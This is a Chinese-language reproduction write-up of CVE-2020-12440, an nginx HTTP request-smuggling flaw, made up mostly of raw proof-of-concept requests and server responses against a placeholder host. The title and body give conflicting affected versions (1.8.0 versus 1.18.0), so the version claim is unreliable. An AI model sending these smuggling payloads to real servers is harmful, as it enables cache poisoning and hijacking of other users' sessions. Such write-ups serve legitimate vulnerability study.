<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私</h1><h2>一、漏洞简介</h2><p>Nginx 1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p><h2>二、漏洞影响</h2><p>Nginx &lt;= 1.8.0</p><h2>三、复现过程</h2><p>1589967192.jpg</p><h3>Request</h3><p>GET /test.html HTTP/1.1<br />Host: www.0-sec.org<br />Content-Length: 2<br /><br />GET /poc.html HTTP/1.1<br />Host: www.0-sec.org<br />Content-Length: 15</p><h3>Response</h3><p>HTTP/1.1 200 OK<br />Server: nginx/1.18.0<br />Date: Fri, 01 May 2020 18:28:44 GMT<br />Content-Type: text/html<br />Content-Length: 33<br />Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT<br />Connection: keep-alive<br />ETag: "5eaae270-21"<br />Accept-Ranges: bytes<br /><br />&lt;html&gt;&lt;h1&gt;Test Page!&lt;/h1&gt;&lt;/html&gt;<br />HTTP/1.1 200 OK<br />Server: nginx/1.18.0<br />Date: Fri, 01 May 2020 18:28:44 GMT<br />Content-Type: text/html<br />Content-Length: 15<br />Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT<br />Connection: keep-alive<br />ETag: "5eaae23d-f"<br />Accept-Ranges: bytes<br /><br />NGINX PoC File</p><h2>其他例子</h2><h3>Request（200 OK + 405 Method Not Allowed）</h3><p>GET / HTTP/1.1<br />Host: www.0-sec.org<br />Content-Length: 4<br />Transfer-Encoding : chunked<br /><br /><br />46<br />TRACE / HTTP/1.1<br />Host:www.0-sec.org<br />Content-Length:15<br /><br /><br />kk<br />0s</p><h3>Response（200 OK + 405 Method Not Allowed）</h3><p>HTTP/1.1 200 OK<br />Server: nginx/1.18.0<br />Date: Tue, 21 Apr 2020 16:28:12 GMT<br />Content-Type: text/html<br />Content-Length: 612<br />Last-Modified: Tue, 21 Apr 2020 16:08:59 GMT<br />Connection: keep-alive<br />ETag: "5e9f1a9b-264"<br />Accept-Ranges: bytes<br /><br /><br />&lt;!DOCTYPE html&gt;<br />&lt;html&gt;<br />&lt;head&gt;<br />&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br />&lt;style&gt;<br />    body {<br />        width: 35em;<br />        margin: 0 auto;<br />        font-family: Tahoma, Verdana, Arial, sans-serif;<br />    }<br />&lt;/style&gt;<br />&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;<br />&lt;p&gt;If you see this page, the nginx web server is successfully installed and<br />working. Further configuration is required.&lt;/p&gt;<br /><br />&lt;p&gt;For online documentation and support please refer to<br />&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br /&gt;<br />Commercial support is available at<br />&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;<br /><br />&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br />HTTP/1.1 405 Not Allowed<br />Server: nginx/1.18.0<br />Date: Tue, 21 Apr 2020 16:28:12 GMT<br />Content-Type: text/html<br />Content-Length: 157<br />Connection: close<br /><br /><br />&lt;html&gt;<br />&lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;<br />&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;</p><h3>Request（200 OK + 404 Not Found）</h3><p>GET / HTTP/1.1<br />Host: www.0-sec.org<br />Content-Length: 4<br />Transfer-Encoding : chunked<br /><br />46<br />GET /404 HTTP/1.1<br />Host:www.0-sec.org<br />Content-Length:15<br /><br />kk<br />0s</p><h3>Response（200 OK + 404 Not Found）</h3><p>HTTP/1.1 200 OK<br />Server: nginx/1.18.0<br />Date: Tue, 21 Apr 2020 16:23:52 GMT<br />Content-Type: text/html<br />Content-Length: 612<br />Last-Modified: Tue, 21 Apr 2020 16:08:59 GMT<br />Connection: keep-alive<br />ETag: "5e9f1a9b-264"<br />Accept-Ranges: bytes<br /><br /><br />&lt;!DOCTYPE html&gt;<br />&lt;html&gt;<br />&lt;head&gt;<br />&lt;title&gt;Welcome to nginx!&lt;/title&gt;<br />&lt;style&gt;<br />    body {<br />        width: 35em;<br />        margin: 0 auto;<br />        font-family: Tahoma, Verdana, Arial, sans-serif;<br />    }<br />&lt;/style&gt;<br />&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;<br />&lt;p&gt;If you see this page, the nginx web server is successfully installed and<br />working. Further configuration is required.&lt;/p&gt;<br /><br />&lt;p&gt;For online documentation and support please refer to<br />&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br /&gt;<br />Commercial support is available at<br />&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;<br /><br />&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br />HTTP/1.1 404 Not Found<br />Server: nginx/1.18.0<br />Date: Tue, 21 Apr 2020 16:23:52 GMT<br />Content-Type: text/html<br />Content-Length: 153<br />Connection: keep-alive<br /><br /><br />&lt;html&gt;<br />&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;<br />&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;</p></body></html>